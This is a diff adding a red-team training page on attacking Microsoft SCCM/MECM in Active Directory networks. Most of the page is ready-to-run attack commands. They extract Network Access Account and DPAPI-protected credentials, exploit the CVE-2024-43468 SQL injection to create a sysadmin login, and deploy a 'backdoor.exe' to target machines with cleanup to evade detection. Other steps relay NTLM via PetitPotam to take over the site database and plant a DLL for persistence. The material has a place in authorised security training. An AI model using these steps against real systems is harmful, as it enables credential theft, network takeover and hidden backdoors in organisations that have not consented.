@@ -1,0 +1,230 @@
+---
+layout: training-page
+title: "SCCM / MECM Attacks — Red Team Academy"
+module: "Active Directory"
+tags:
+  - sccm
+  - mecm
+  - deployment
+  - credential-theft
+  - lateral-movement
+  - active-directory
+page_key: "ad-sccm-attacks"
+---
+<h1>SCCM / MECM Attacks</h1>
+<p>Microsoft Configuration Manager (SCCM, now called MECM — Microsoft Endpoint Configuration Manager) is widely deployed for software distribution, patch management, and device configuration across enterprise networks. Its privileged position in the network and the credentials it stores make it a high-value target. This page covers credential extraction, privilege escalation, lateral movement, and takeover techniques.</p>
+
+<h2>Architecture Overview</h2>
+<pre><code>Primary Site Server  — Central SCCM control server, has MSSQL database
+Distribution Point   — Serves software packages to clients (SMB share: SCCMContentLib$)
+Management Point     — Clients communicate here for policy and status
+SCCM Client          — Installed on managed endpoints, pulls policy from management point
+NAA                  — Network Access Account: a domain account stored in SCCM used for unauthenticated content access</code></pre>
+
+<h2>Enumeration</h2>
+<h3>SCCMHunter</h3>
+<pre><code># Install
+pip install sccmhunter
+
+# Discover SCCM assets in the domain
+sccmhunter.py find -u user -p 'Password123' -dc-ip 10.10.10.10 -d domain.lab
+
+# Show discovered site servers
+sccmhunter.py show -siteservers</code></pre>
+
+<h3>SharpSCCM</h3>
+<pre><code># Get managed devices from a known server and site code
+.\SharpSCCM.exe get devices --server &lt;SERVER_NAME&gt; --site-code &lt;SITE_CODE&gt;
+
+# Get all SCCM secrets (NAA, task sequence credentials)
+.\SharpSCCM.exe get secrets
+
+# Execute command on a device
+.\SharpSCCM.exe exec -d WS01 -p "C:\Windows\System32\cmd.exe /c whoami &gt; C:\temp\out.txt" -s --debug</code></pre>
+
+<h3>MalSCCM</h3>
+<pre><code># From a compromised SCCM client — locate management server
+MalSCCM.exe locate
+
+# Enumerate over WMI as Distribution Point admin
+MalSCCM.exe inspect /server:&lt;DP_FQDN&gt; /groups
+
+# From management server — enumerate targets
+MalSCCM.exe inspect /all
+MalSCCM.exe inspect /computers
+MalSCCM.exe inspect /primaryusers
+MalSCCM.exe inspect /groups
+MalSCCM.exe inspect /applications
+MalSCCM.exe inspect /deployments</code></pre>
+
+<h2>Credential Theft from SCCM</h2>
+<h3>CRED-1: PXE Boot Credential Extraction</h3>
+<p>If PXE boot is enabled and the boot media is not password-protected, you can extract the Network Access Account credentials from the PXE response.</p>
+<pre><code># Check if PXE is enabled on distribution point:
+# HKLM\Software\Microsoft\SMS\DP\PxeInstalled = 1
+# HKLM\Software\Microsoft\SMS\DP\IsPxe = 1
+
+# Capture PXE response on network
+sudo python3 pxethiefy.py explore -i eth0
+
+# Alternative: PXEThief
+# https://github.com/MWR-CyberSec/PXEThief</code></pre>
+
+<h3>CRED-2: Network Access Account (NAA) via Policy Request</h3>
+<p>The NAA is a domain account stored in SCCM policy. When PKI certificates are not required for client authentication, you can spoof a new client and request the NAA policy directly.</p>
+<pre><code># Create a fake machine account
+addcomputer.py -computer-name 'attacker$' -computer-pass 'Password123' \
+  -dc-ip 10.10.10.10 domain.lab/user:'Password123'
+
+# Request NAA credentials via SharpSCCM (easy mode)
+.\SharpSCCM.exe get naa -r newdevice -u attacker$ -p Password123
+.\SharpSCCM.exe get naa
+.\SharpSCCM.exe get secrets -u &lt;machine-account$&gt; -p &lt;password&gt;
+
+# Stealthy mode using sccmwtf
+# 1. Add MECM server to /etc/hosts: 192.168.33.11 MECM MECM.SCCM.LAB
+# 2. Request policy
+python3 sccmwtf.py fake fakepc.sccm.lab MECM 'SCCMLAB\customsccm$' 'Password123'
+
+# 3. Decrypt the NAA credentials
+cat /tmp/naapolicy.xml | grep 'NetworkAccessUsername\|NetworkAccessPassword' -A 5 \
+  | grep -e 'CDATA' | cut -d '[' -f 3 | cut -d ']' -f 1 \
+  | xargs -I {} python3 policysecretunobfuscate.py {}</code></pre>
+
+<h3>CRED-3: Extract DPAPI Blobs from WMI</h3>
+<p>On SCCM clients, credentials are stored as DPAPI-encrypted blobs in the WMI repository. Requires local admin on the SCCM client.</p>
+<pre><code># Find SCCM credential blobs in WMI
+Get-WmiObject -namespace "root\ccm\policy\Machine\ActualConfig" -class "CCM_NetworkAccessAccount"
+# Output example:
+# NetworkAccessPassword : &lt;![CDATA[E600000001...8C6B5]]&gt;
+# NetworkAccessUsername : &lt;![CDATA[E600000001...00F92]]&gt;
+
+# Decrypt using SharpSCCM
+.\SharpSCCM.exe local secrets -m wmi
+
+# Decrypt using SharpDPAPI
+$str = "060...F2DAF"
+$bytes = for($i=0; $i -lt $str.Length; $i++) {
+  [byte]::Parse($str.Substring($i, 2), [System.Globalization.NumberStyles]::HexNumber); $i++
+}
+$b64 = [Convert]::ToBase64String($bytes[4..$bytes.Length])
+.\SharpDPAPI.exe blob /target:$b64 /mkfile:masterkeys.txt
+
+# Remote extraction via SCCMHunter
+python3 ./sccmhunter.py http -u "administrator" -p "Password123" \
+  -d domain.lab -dc-ip 10.10.10.10 -auto</code></pre>
+
+<h3>CRED-4: Extract from CIM Repository (Disk)</h3>
+<pre><code># Search WMI repository on disk for SCCM credentials
+.\SharpSCCM.exe local secrets -m disk
+.\SharpDPAPI.exe search /type:file /path:C:\Windows\System32\wbem\Repository\OBJECTS.DATA
+
+# Check ACL on repository file
+Get-Acl C:\Windows\System32\wbem\Repository\OBJECTS.DATA | Format-List -Property PSPath,sddl</code></pre>
+
+<h3>CRED-5: Site Database — SC_UserAccount Table</h3>
+<pre><code># Requires site database access and site server's private key
+# Using Mimikatz
+mimikatz# misc::sccm /connectionstring:"DRIVER={SQL Server};Trusted=true;DATABASE=ConfigMgr_CHQ;SERVER=CM1;"
+
+# Using SQLRecon
+SQLRecon.exe /auth:WinToken /host:CM1 /database:ConfigMgr_CHQ /module:sDecryptCredentials
+
+# Dump encrypted credentials from DB then decrypt
+SQLRecon.exe /auth:WinToken /host:&lt;SITE-DB&gt; /database:CM_&lt;SITECODE&gt; \
+  /module:query /command:"SELECT * FROM SC_UserAccount"
+sccmdecryptpoc.exe 0C010000080...5D6F0</code></pre>
+
+<h2>CVE-2024-43468 — Unauthenticated SQL Injection</h2>
+<pre><code># SCCM ConfigMgr 2403 unauthenticated SQLi
+# Exploit: create a sysadmin account, then access DB directly
+
+python3 CVE-2024-43468.py -t cmc.corp.local \
+  -sql "create login [CORP\user1] from windows ; \
+        exec master.dbo.sp_addsrvrolemember [CORP\user1], 'sysadmin'"
+
+mssqlclient.py -debug -windows-auth 'CORP/user1:xxx'@cmc-db.corp.local
+SQL&gt; select name from sysdatabases where name like 'CM_%'</code></pre>
+
+<h2>Lateral Movement via Application Deployment</h2>
+<pre><code># 1. Create a new device group for your targets
+MalSCCM.exe group /create /groupname:TargetGroup /grouptype:device
+
+# 2. Add target machines to the group
+MalSCCM.exe group /addhost /groupname:TargetGroup /host:WIN2016-SQL
+
+# 3. Create a malicious application pointing to your payload
+#    (must be on a share the SCCM server can access)
+MalSCCM.exe app /create /name:demoapp /uncpath:"\\BLORE-SCCM\SCCMContentLib$\backdoor.exe"
+
+# 4. Deploy the application to target group
+MalSCCM.exe app /deploy /name:demoapp /groupname:TargetGroup /assignmentname:demodeployment
+
+# 5. Force clients to check in immediately
+MalSCCM.exe checkin /groupname:TargetGroup
+
+# 6. Cleanup to avoid detection
+MalSCCM.exe app /cleanup /name:demoapp
+MalSCCM.exe group /delete /groupname:TargetGroup</code></pre>
+
+<h2>SCCM Relay Attacks</h2>
+<h3>TAKEOVER1 — Low Priv to DB Admin via MSSQL Relay</h3>
+<pre><code># Requirements: DB on separate server from site server, site server is sysadmin on DB
+
+# Generate privilege-escalation SQL query
+python3 sccmhunter.py mssql -u carol -p SCCMftw -d sccm.lab \
+  -dc-ip 192.168.33.10 -tu carol -sc P01 -stacked
+
+# Set up NTLM relay to the MSSQL server
+ntlmrelayx.py -smb2support -ts -t mssql://192.168.33.12 \
+  -q "USE CM_P01; INSERT INTO RBAC_Admins ..."
+
+# Coerce authentication from site server
+petitpotam.py -d sccm.lab -u carol -p SCCMftw 192.168.33.1 192.168.33.11
+
+# Connect as SCCM admin
+python3 sccmhunter.py admin -u carol@sccm.lab -p 'SCCMftw' -ip 192.168.33.11</code></pre>
+
+<h3>TAKEOVER2 — Low Priv to MECM Admin via SMB Relay</h3>
+<pre><code># Requirements: site server's computer account is admin on MSSQL server
+
+# Start SOCKS relay targeting the MSSQL server
+ntlmrelayx.py -t 192.168.33.12 -smb2support -socks
+
+# Coerce auth from site server using NAA credentials retrieved from SCCM
+petitpotam.py -d sccm.lab -u sccm-naa -p '123456789' 192.168.33.1 192.168.33.11
+
+# Use SOCKS to access the MSSQL server as MECM computer account
+proxychains -q smbexec.py -no-pass SCCMLAB/'MECM$'@192.168.33.12
+proxychains -q secretsdump.py -no-pass SCCMLAB/'MECM$'@192.168.33.12</code></pre>
+
+<h2>SCCM Persistence via CcmPwn</h2>
+<pre><code># CcmExec service runs on every interactive session on SCCM clients
+# Requires admin on the target machine
+
+# Backdoor SCNotification.exe.config to load your DLL
+python3 ccmpwn.py domain/user:password@workstation.domain.local exec \
+  -dll evil.dll -config exploit.config
+
+# Coerce authentication to an attacker-controlled share
+python3 ccmpwn.py domain/user:password@workstation.domain.local coerce \
+  -computer 10.10.10.10</code></pre>
+
+<h2>Key Tools</h2>
+<pre><code>SharpSCCM     — github.com/Mayyhem/SharpSCCM
+MalSCCM       — github.com/nettitude/MalSCCM
+SCCMHunter    — github.com/garrettfoster13/sccmhunter
+CMLoot        — github.com/1njected/CMLoot (SMB share loot)
+Misconfig-Mgr — github.com/subat0mik/Misconfiguration-Manager
+SharpDPAPI    — github.com/GhostPack/SharpDPAPI
+sccmwtf       — github.com/xpn/sccmwtf
+CcmPwn        — github.com/mandiant/CcmPwn</code></pre>
+
+<h2>Resources</h2>
+<ul>
+  <li>InternalAllTheThings — SCCM — <code>swisskyrepo.github.io/InternalAllTheThings</code></li>
+  <li>Misconfiguration Manager — <code>github.com/subat0mik/Misconfiguration-Manager</code></li>
+  <li>Attacking and Defending Configuration Manager — Logan Goins — <code>logan-goins.com/2025-04-25-sccm/</code></li>
+  <li>The Phantom Credentials of SCCM — Duane Michael — <code>posts.specterops.io</code></li>
+  <li>CVE-2024-43468 — <code>github.com/synacktiv/CVE-2024-43468</code></li>
+</ul>
